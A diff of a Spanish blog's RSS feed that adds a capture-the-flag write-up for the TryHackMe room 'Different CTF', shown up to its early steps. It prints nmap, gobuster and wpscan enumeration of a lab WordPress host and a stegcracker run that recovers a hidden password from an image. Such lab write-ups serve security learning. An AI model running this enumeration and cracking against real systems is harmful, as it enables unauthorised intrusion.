@@ -12,7 +12,7 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>es</language>
     <copyright>©{year}, All Rights Reserved</copyright>
-    <lastBuildDate>Tue, 23 Mar 2021 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Sat, 24 Apr 2021 00:00:00 +0000</lastBuildDate>
     <sy:updatePeriod>daily</sy:updatePeriod>
     <sy:updateFrequency>daily</sy:updateFrequency>
     
@@ -21,6 +21,1129 @@
     
     
 
+      
+      <item>
+        <title>TryHackMe - Different CTF</title>
+        <link>https://sckull.github.io/posts/differentctf/</link>
+        <pubDate>Sat, 24 Apr 2021 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Sat, 24 Apr 2021 00:00:00 +0000</atom:modified>
+        <guid>https://sckull.github.io/posts/differentctf/</guid>
+        <description>Different CTF es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
+        <content:encoded>&lt;p&gt;Different CTF es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;
+
+
+
+
+  
+
+
+
+  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
+    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/differentctf/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
+  &lt;/div&gt;
+
+&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Titulo&lt;/th&gt;
+&lt;th&gt;Different CTF&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Room&lt;/td&gt;
+&lt;td&gt;Different CTF&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Info&lt;/td&gt;
+&lt;td&gt;interesting room, you can shoot the sun&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Dificultad&lt;/td&gt;
+&lt;td&gt;Dificil&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Maker&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/hakanbey01&#34;&gt;hakanbey01&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
+&lt;p&gt;Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ftp (21) abiertos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.91 scan initiated Mon Apr 19 20:35:16 2021 as: nmap -p- --min-rate 10000 -oN allports 10.10.200.139&lt;/span&gt;
+Warning: 10.10.200.139 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.200.139 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.200.139&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.31s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;37023&lt;/span&gt; closed ports, &lt;span class=&#34;m&#34;&gt;28510&lt;/span&gt; filtered ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+80/tcp open  http
+
+&lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon Apr 19 20:38:02 2021 -- 1 IP address (1 host up) scanned in 166.18 seconds&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# Nmap 7.91 scan initiated Mon Apr 19 21:12:24 2021 as: nmap -sC -sV -oN serviceports 10.10.200.139&lt;/span&gt;
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; adana.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.200.139&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.25s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+80/tcp open  http    Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-generator: WordPress 5.6
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.29 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Hello World &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#8211; Just another WordPress site&lt;/span&gt;
+Service Info: OS: Unix
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon Apr 19 21:13:10 2021 -- 1 IP address (1 host up) scanned in 45.87 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
+&lt;p&gt;Vemos un dominio de redireccion en la pagina principal, el cual agregamos a nuestro archivo &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;HTTP/1.1 &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK
+Date: Tue, &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; 00:55:24 GMT
+Server: Apache/2.4.29 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Link: &amp;lt;http://adana.thm/index.php/wp-json/&amp;gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;https://api.w.org/&amp;#34;&lt;/span&gt;
+Content-Type: text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;UTF-8
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Al visitar el puerto 80 vemos que esta corriendo wordpress.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/differentctf/Screenshot_1.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
+&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos. Vemos directorios que no son comunes: &lt;code&gt;announcements&lt;/code&gt; y &lt;code&gt;phpmyadmin&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;╭─kali@kali ~/thm/differentctf  
+╰─➤  gohttp http://adana.thm/
+/announcements        &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Size: 314&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;--&amp;gt; http://adana.thm/announcements/&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+/index.php            &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Size: 0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;--&amp;gt; http://adana.thm/&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;                
+/index.php            &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Size: 0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;--&amp;gt; http://adana.thm/&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;                
+/javascript           &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Size: 311&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;--&amp;gt; http://adana.thm/javascript/&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;   
+/license.txt          &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Size: 19915&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;                                    
+/phpmyadmin           &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Size: 311&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;--&amp;gt; http://adana.thm/phpmyadmin/&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;   
+/readme.html          &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Size: 7278&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;                                     
+/server-status        &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Size: 274&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;                                      
+/wp-admin             &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Size: 309&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;--&amp;gt; http://adana.thm/wp-admin/&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;     
+/wp-blog-header.php   &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Size: 0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;                                        
+/wp-includes          &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Size: 312&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;--&amp;gt; http://adana.thm/wp-includes/&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  
+/wp-content           &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Size: 311&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;--&amp;gt; http://adana.thm/wp-content/&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;   
+/wp-load.php          &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Size: 0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;                                        
+/wp-links-opml.php    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Size: 224&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;                                      
+/wp-mail.php          &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Size: 2672&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;                                     
+/wp-settings.php      &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 500&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Size: 0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;                                        
+/wp-trackback.php     &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Size: 135&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;                                      
+/wp-login.php         &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Size: 6544&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;                                     
+/wp-config.php        &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Size: 0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;                                        
+/wp-cron.php          &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Size: 0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;                                        
+/wp-signup.php        &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Size: 0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;--&amp;gt; http://adana.thm/wp-login.php?action&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;register&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+/xmlrpc.php           &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 405&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Size: 42&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;                                                   
+/xmlrpc.php           &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 405&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Size: 42&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;wpscan&#34;&gt;WPSCAN&lt;/h2&gt;
+&lt;p&gt;Tambien enumeramos plugins, temas y usuarios utilizando wpscan. Encontramos un usuario y la version desactualizada de wordpress.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; WordPress version 5.6 identified &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Outdated, released on 2020-12-08&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Found By: Rss Generator &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Passive Detection&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  - http://adana.thm/index.php/feed/, &amp;lt;generator&amp;gt;https://wordpress.org/?v&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5.6&amp;lt;/generator&amp;gt;
+ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  - http://adana.thm/index.php/comments/feed/, &amp;lt;generator&amp;gt;https://wordpress.org/?v&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5.6&amp;lt;/generator&amp;gt;
+
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; hakanbey01
+ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Found By: Author Posts - Author Pattern &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Passive Detection&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Confirmed By:
+ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  Rss Generator &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Passive Detection&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  Wp Json Api &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   - http://adana.thm/index.php/wp-json/wp/v2/users/?per_page&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;100&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;page&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
+ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  Author Id Brute Forcing - Author Pattern &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  Login Error Messages &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Observamos en &lt;code&gt;/announcements/&lt;/code&gt; dos archivos, un &amp;ldquo;wordlist&amp;rdquo; y una imagen.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/differentctf/Screenshot_2.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;En &lt;code&gt;/phpmyadmin&lt;/code&gt; vemos el panel de logeo de este administrador.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/differentctf/Screenshot_3.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;steganography&#34;&gt;STEGANOGRAPHY&lt;/h2&gt;
+&lt;p&gt;Utilizamos &lt;code&gt;stegcracker&lt;/code&gt; con la imagen y wordlist encontrados, obtenemos credenciales para el servicio ftp.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;╭─kali@kali ~/thm/differentctf  
+╰─➤  stegcracker austrailian-bulldog-ant.jpg wordlist.txt
+
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+
+Counting lines in wordlist..
+Attacking file &lt;span class=&#34;s1&#34;&gt;&amp;#39;austrailian-bulldog-ant.jpg&amp;#39;&lt;/span&gt; with wordlist &lt;span class=&#34;s1&#34;&gt;&amp;#39;wordlist.txt&amp;#39;&lt;/span&gt;..
+Successfully cracked file with password: 123adanaantinwar
+Tried &lt;span class=&#34;m&#34;&gt;49380&lt;/span&gt; passwords
+Your file has been written to: austrailian-bulldog-ant.jpg.out
+123adanaantinwar
+╭─kali@kali ~/thm/differentctf  
+╰─➤  cat austrailian-bulldog-ant.jpg.out 
